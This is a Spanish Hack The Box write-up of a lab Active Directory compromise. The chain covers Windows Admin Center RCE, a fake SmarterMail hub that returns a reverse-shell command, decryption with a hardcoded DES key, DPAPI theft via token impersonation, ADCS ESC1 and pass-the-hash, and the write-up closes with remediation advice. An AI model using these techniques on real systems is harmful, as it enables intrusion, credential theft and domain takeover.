---
title: "HTB DanglingTree — WAC + SmarterMail RCE + DPAPI + ADCS ESC1"
date: 2026-08-15 10:00:00 -0400
categories: [Writeups, Active Directory]
tags: [htb, active-directory, windows-admin-center, smartermail, dpapi, adcs, esc1, oscp]
---

## Resumen

**DanglingTree** es una máquina Windows Active Directory de HTB, dificultad **Medium**, que encadena cinco técnicas muy distintas hasta Domain Admin: un PDF de Rules of Engagement filtrado por SMB anónimo, login automatizado RSA-OAEP contra **Windows Admin Center**, RCE no autenticada en **SmarterMail** (CVE-2026-24423), recuperación de contraseñas DES de un dominio de correo "de baja", bypass de restricciones vía impersonación de token para robar DPAPI, y el vector que le da nombre a la máquina: una **plantilla de certificado eliminada pero aún publicada en la CA** → ESC1.

| Campo | Valor |
|---|---|
| IP | `10.129.104.204` |
| SO | Windows Server 2025 · AD DC |
| Dificultad | Medium |
| Técnicas | WAC · SmarterMail CVE-2026-24423 · DPAPI · ADCS ESC1 |

## Reconocimiento

Un DC de dominio (`danglingtree.htb`) con el stack habitual (Kerberos, LDAP, SMB firmado, RDP) más dos puertos fuera de lo común: **6600** (Windows Admin Center) y, visible solo desde dentro, **17017** (motor interno de un servidor de correo).

```bash
nmap -p- --min-rate 2000 -T4 -sV 10.129.104.204

53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          danglingtree.htb
443/tcp   open  ssl/https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
6600/tcp  open  ssl/http      Windows Admin Center (WAC)
clock-skew: mean: 7h00m02s   # apuntar esto — reaparece más adelante
```

> Un DC de laboratorio normalmente no expone Windows Admin Center. Es un panel de gestión completo (PowerShell remoto, eventos, servicios) pensado para administrar el host desde el navegador — si hay credenciales válidas para él, es RCE de fábrica.
{: .prompt-info }

> Anotá el `clock-skew` desde el primer nmap. Te ahorra 20 minutos de "por qué me da KRB_AP_ERR_SKEW" más adelante.
{: .prompt-tip }

SMB permite sesión nula. El share **IT** es de lectura libre y en `Security\` guarda el propio informe de Rules of Engagement del pentest — con credenciales dentro.

```bash
smbclient //danglingtree.htb/IT -N
smb: \> cd Security
smb: \Security\> get DanglingTree_RoE_Assessment.pdf
```

> **Credenciales en el propio PDF de alcance:** el documento incluye una cuenta de "Red Team Access" para pruebas autorizadas del panel de administración.
{: .prompt-danger }

**Credenciales:** `anderson.w : R3dT3am@Acc3ss#01`

## Windows Admin Center: login RSA-OAEP + RCE

WAC no usa auth HTTP estándar (NTLM/Negotiate) en el gateway: la SPA hace un intercambio propio — pide una clave pública JWK, cifra `{usuario,password,csrf}` con RSA-OAEP-SHA256 y lo manda a `/api/user/login`. Automatizarlo evita depender del navegador.

```python
# wac_login.py (resumen)
r = s.get(base + "/")                                    # saca el token csrf del login form
jwk = s.post(base+"/api/user/key", json={"csrf": csrf}).json()["jwk"]
pt  = json.dumps({"username":user, "password":pw, "csrf":csrf})
ct  = jwk_to_pubkey(jwk).encrypt(pt, OAEP(MGF1(SHA256()), SHA256(), None))
s.post(base + "/api/user/login", json={"packet": b64(ct), "csrf": csrf})
# login status=200 → cookies WAC-SESSION / XSRF-TOKEN válidas
```

> Todo el flujo de login es JS puro sobre `fetch()`: se puede leer el `<script>` de la página de login y reimplementarlo en Python sin tocar un navegador ni interceptar tráfico manualmente. Antes de asumir que un panel usa auth "rara" y necesita un browser, mirá el HTML/JS servido sin sesión.
{: .prompt-tip }

Con la sesión válida, la API `invokeCommand` de WAC ejecuta PowerShell arbitrario en el nodo administrado.

```bash
python3 wac_exec.py --node dc.danglingtree.htb --script payload.ps1
# POST /api/services/WinREST/PowerShell/nodes/dc.danglingtree.htb/invokeCommand
[HTTP 200]

nc -lnvp 4444
whoami → danglingtree\anderson.w
```

**Foothold:** `danglingtree\anderson.w`

## CVE-2026-24423 — SmarterMail ConnectToHub RCE

Enumerando el DC desde dentro aparece un puerto que `nmap` nunca vio desde fuera: **17017**, ligado solo a loopback.

```powershell
PS> netstat -ano | findstr LISTENING
TCP  127.0.0.1:25    ...   TCP  0.0.0.0:17017  ...   PID 3328
PS> Invoke-RestMethod http://localhost:17017/api/v1/licensing/about
version: 100.0.9504   # SmarterMail build 9504 → vulnerable a CVE-2026-23760 / CVE-2026-24423
```

> **MailService.exe = svc_mail**, el proceso 3328 posee además 25/110/143/587/5222 (SMTP/POP3/IMAP/submission/XMPP) — es el motor completo de SmarterMail corriendo con su propia cuenta de servicio.
{: .prompt-warning }

La CA/hub de clustering de SmarterMail (`connect-to-hub`) es un endpoint **sin autenticación**: acepta que le indiquemos una URL de "hub" propia y confía ciegamente en su respuesta, que incluye un bloque `SystemMount` cuyo campo `CommandMount` se ejecuta como comando del sistema al intentar montarlo.

```python
# servidor HTTP propio en 10.10.17.135:8082
def do_POST(self):                      # path esperado: /web/api/node-management/setup-initial-connection
    resp = {
      "SystemMount": {
        "Enabled": True, "MountPath": "C:\\Windows\\Temp\\hubmnt1",
        "CommandMount": "cmd.exe /c powershell -nop -w hidden -e <b64 reverse shell>"
      }
    }
    self._send_json(200, resp)
```

> El flujo de "unirse a un cluster" está pensado para que un nodo confíe en el hub que se le indique en el primer setup — SmarterMail nunca valida que ese hub sea legítimo antes de aplicar la configuración que devuelve. "Unauthenticated" no siempre significa "sin login": aquí significa que **el servidor confía en un peer que él mismo contacta**, un SSRF con callback controlado por el atacante.
{: .prompt-danger }

```powershell
PS> Invoke-RestMethod -Uri http://localhost:17017/api/v1/settings/sysadmin/connect-to-hub -Method Post -Body (@{hubAddress="http://10.10.17.135:8082";oneTimePassword="test";nodeName="dc"}|ConvertTo-Json)

[fake_hub] POST /web/api/node-management/setup-initial-connection
[fake_hub] Sent malicious response
nc -lnvp 4446 → connection from DC → whoami → danglingtree\svc_mail
```

**RCE no autenticada:** `danglingtree\svc_mail`

## Contraseña DES de un dominio de correo "de baja"

`svc_mail` sí puede leer los datos propios de SmarterMail. Ahí aparece `danglingtree.htb.bak`: un backup del dominio de correo con los buzones intactos, incluida la contraseña cifrada de cada usuario.

```powershell
PS> Get-ChildItem C:\SmarterMail\Domains\danglingtree.htb.bak\Users
amelia.r  emma.s  liam.m  noah.b  oliver.t  sophia.k  svc_mail

PS> Get-Content ...\noah.b\settings.json -Raw
"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
```

SmarterMail cifra estas contraseñas con DES-CBC y una **clave hardcodeada** en `SmarterMail.Standard.dll` (idéntica en todas las instalaciones de esa build), sin depender de ningún secreto por-servidor.

```python
key = bytes([180,63,132,209,16,180,233,145])
iv  = bytes([1,216,174,230,73,173,146,39])
pt  = unpad(DES.new(key, DES.MODE_CBC, iv).decrypt(b64decode(ct)), 8)
# noah.b → RiverDragon#Storm25
```

> Cuando el cifrado depende de una clave hardcodeada en el binario (en vez de una derivada por instalación/DPAPI/AD), basta con **un** valor cifrado filtrado para descifrar todas las cuentas de cualquier instalación de esa versión. Ante `*_encrypted` en un config de una app de terceros, sospechá primero de clave estática antes de asumir que hace falta romper cripto de verdad.
{: .prompt-tip }

> **Reutilización de contraseña:** `noah.b` no es solo un buzón, es también cuenta real de Windows/AD, y su contraseña de correo es la misma que la de dominio.
{: .prompt-warning }

**Credenciales:** `noah.b : RiverDragon#Storm25`

## Bypass de restricción + robo de DPAPI

`noah.b` no tiene WinRM ni permisos suficientes para RDP en el DC, y `svc_mail` no tiene ACL sobre el perfil de `noah.b` — pero se conoce su contraseña. El proceso de `svc_mail` además corre en un contexto endurecido (AppLocker/WDAC) donde hasta `whoami.exe` "no existe".

> **Rutas de escalada descartadas:** WinRM directo (403 `PSRemotingTransportException`), `Start-Process -Credential` (falla en sesión no interactiva), tareas programadas como `noah.b` (falta `SeBatchLogonRight`), `Invoke-WmiMethod` local con credenciales alternas (bloqueado por Windows para "local connections").
{: .prompt-warning }

Solución: generar un token de `noah.b` en memoria con **LogonUser** (tipo `LOGON32_LOGON_INTERACTIVE`) e **ImpersonateLoggedOnUser**, sin abrir ninguna sesión nueva ni disparar la política que oculta rutas del sistema a un usuario estándar.

```powershell
Add-Type -TypeDefinition '[DllImport("advapi32.dll")] LogonUser(...); ImpersonateLoggedOnUser(...); RevertToSelf();'

[Adv]::LogonUser("noah.b","DANGLINGTREE","RiverDragon#Storm25", 2 # LOGON32_LOGON_INTERACTIVE, 0, [ref]$tok)
[Adv]::ImpersonateLoggedOnUser($tok)
[WindowsIdentity]::GetCurrent().Name → DANGLINGTREE\noah.b

Get-ChildItem C:\Users\noah.b\AppData\Roaming\Microsoft\Protect, ...\Credentials -Recurse -Force
[Adv]::RevertToSelf()
```

> `LOGON32_LOGON_NETWORK` genera un token que Windows trata como "sesión de red" y algunas políticas lo ocultan igual que a un usuario interactivo restringido; `LOGON32_LOGON_INTERACTIVE` produce un token que carga el contexto del usuario "de verdad" (incluye su perfil), suficiente para leer sus propios ficheros vía syscalls sin lanzar ningún proceso nuevo — por eso esquiva la política que bloquea `whoami.exe`/`schtasks.exe` para cuentas no privilegiadas.
{: .prompt-danger }

> Si tenés usuario+contraseña pero cero vías de RCE remoto para esa cuenta, `LogonUser` + `ImpersonateLoggedOnUser` desde cualquier proceso donde ya tengas ejecución te da su contexto de seguridad sin WinRM/RDP/batch logon.
{: .prompt-tip }

Con el hilo impersonando a `noah.b`, se leen en memoria la masterkey DPAPI y el blob de Credential Manager, se pasan a base64 y se decodifican fuera del DC para desencriptar offline con la contraseña ya conocida.

```bash
dpapi.py masterkey -file f53fcaba-...-bf0f -sid S-1-5-21-...-1602 -password 'RiverDragon#Storm25'
Decrypted key: 0x7120d9ad...aad0d8

dpapi.py credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key 0x7120d9ad...aad0d8
Target   : Domain:target=PC01.danglingtree.htb
Username : alex.o    Password: SunsetMountainPeak@2025
```

> **Credencial guardada para RDP a PC01:** `noah.b` había guardado en su Credential Manager las credenciales de `alex.o` para conectarse a otra máquina — típico botín de DPAPI.
{: .prompt-danger }

**Credenciales:** `alex.o : SunsetMountainPeak@2025`

## ADCS ESC1 vía plantilla eliminada (el "DanglingTree")

`alex.o` tiene *ForceChangePassword* sobre `jake.h`, miembro de `Template_Editors` y `Helpdesk_Cert_Support` (ManageCertificates → ESC7 potencial). Pero la CA publica una plantilla, **EmployeeAuthTemplate**, cuyo objeto `pKICertificateTemplate` ya no existe: una referencia colgante — el nombre de la máquina.

```
alex.o (DPAPI de noah.b)
  └─▶ ForceChangePassword sobre jake.h (Template_Editors / Helpdesk_Cert_Support)
        └─▶ CREATE_CHILD en Certificate Templates → recrea EmployeeAuthTemplate
              (ya publicada en danglingtree-DC-CA, objeto borrado)
              └─▶ ESC1 → certificado con UPN/SID arbitrario
                    └─▶ Administrator (Domain Admin)
```

```bash
bloodyAD --host dc.danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' set password jake.h 'Wither123!'
[+] Password changed successfully!
```

```python
# la CA ya referencia "EmployeeAuthTemplate" pero el objeto no existe en el contenedor
conn.search(ca_base, '(objectClass=pKIEnrollmentService)', attributes=['certificateTemplates'])
certificateTemplates: [..., 'EmployeeAuthTemplate', ...]   # dangling reference

# jake.h (Template_Editors) tiene CREATE_CHILD → recreamos el objeto mínimo válido
conn.add('CN=EmployeeAuthTemplate,CN=Certificate Templates,...', attributes={
  'objectClass': ['top','pKICertificateTemplate'], 'cn': 'EmployeeAuthTemplate',
  'msPKI-Cert-Template-OID': '1.3.6.1.4.1.311.21.8...174.1.500', ...})
ADD result: True
```

> La CA no valida al publicar/emitir que el objeto de la plantilla siga existiendo por GUID: solo mira el **nombre** en `certificateTemplates`. Si alguien borró el objeto pero olvidó despublicarlo de la CA, cualquiera con `CREATE_CHILD` en el contenedor puede crear un objeto nuevo con ese mismo `cn` y la CA lo aceptará como si fuera el original — y como creador, el atacante es dueño (full control) del objeto nuevo.
{: .prompt-danger }

> En `certipy find`, si una plantilla aparece en `certificateTemplates` de la CA pero no en el listado de objetos `pKICertificateTemplate`, es exactamente esta condición — nunca asumas que "no aparece" significa "no explotable".
{: .prompt-tip }

```bash
certipy template -u jake.h@danglingtree.htb -p 'Wither123!' -template EmployeeAuthTemplate
[*] Successfully updated 'EmployeeAuthTemplate'  # config ESC1 por defecto: Enrollee Supplies Subject + Authenticated Users Full Control

certipy req -u jake.h@danglingtree.htb -p 'Wither123!' -ca danglingtree-DC-CA -template EmployeeAuthTemplate -dynamic-endpoint \
  -upn 'administrator@danglingtree.htb' -sid S-1-5-21-4220238332-57023728-1129110646-500
[*] Saved certificate and private key to 'administrator2.pfx'

# reloj del DC ~7h adelantado (visto en el nmap inicial) → PKINIT falla con KRB_AP_ERR_SKEW
faketime '2026-08-15 22:28:05 UTC' certipy auth -pfx administrator2.pfx -domain danglingtree.htb -username administrator
Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

Pass-the-hash final con NetExec: `nxc smb dc.danglingtree.htb -u administrator -H 8cacb3a97e460c65d105ca7cd9913925` → `(Pwn3d!)`

**User flag:** `c764338cd2dd4f723ec5c3f56ff8649e`
**Root flag (Domain Admin):** `e7550fe9d42f12eff81dc2b3983c5375`

## Remediación

| Vulnerabilidad | Severidad | Mitigación |
|---|---|---|
| Credenciales en documento SMB anónimo (PDF de RoE con credenciales reales en un share sin auth) | Crítica | Nunca guardar secretos en documentos de alcance; deshabilitar sesión nula/guest en SMB |
| CVE-2026-24423 — SmarterMail ConnectToHub RCE (endpoint de clustering sin auth ejecuta comandos vía `CommandMount`) | Crítica | Actualizar a SmarterMail build 9518+; restringir 17017 a loopback real (firewall) y desactivar clustering si no se usa |
| Cifrado DES con clave estática (contraseñas de buzones recuperables con clave hardcodeada) | Crítica | Migrar a cifrado con clave derivada por instalación/DPAPI/HSM; purgar dominios de backup sin cifrado adicional |
| Reutilización de contraseña correo↔dominio | Media | Contraseñas independientes para cuentas de servicio de aplicaciones vs. cuentas AD |
| Plantilla de certificado despublicada sin eliminar de la CA ("dangling reference" en `certificateTemplates`) | Crítica | Al borrar una plantilla, eliminarla también de `certificateTemplates` en el objeto de la CA; restringir `CREATE_CHILD` sobre el contenedor de plantillas a un grupo mínimo y auditado |
| Reloj del DC desincronizado (~7h) | Media | Sincronización NTP correcta; un skew grande facilita errores de detección en logs basados en tiempo |

**Herramientas:** `nmap` · `smbclient` · `python (requests/cryptography/ldap3)` · `NetExec (nxc)` · `impacket (dpapi.py, wmiexec)` · `certipy` · `bloodyAD` · `rpcclient` · `faketime`
